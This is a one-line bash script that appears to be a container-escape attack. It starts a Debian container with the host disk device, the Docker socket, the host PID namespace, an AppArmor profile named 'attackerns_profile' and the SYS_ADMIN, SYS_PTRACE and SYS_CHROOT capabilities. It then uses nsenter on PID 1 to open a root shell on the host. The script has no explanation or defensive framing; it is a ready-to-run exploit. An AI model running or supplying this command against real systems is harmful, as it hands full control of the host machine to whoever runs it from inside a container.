#!/bin/bash

docker run --device /dev/vda1 -v /var/run/docker.sock:/var/run/docker.sock --security-opt "apparmor=attackerns_profile" --pid=host --cap-add SYS_ADMIN --cap-add SYS_CHROOT --cap-add SYS_PTRACE --rm -it debian:latest nsenter --target 1 --mount --pid /bin/bash
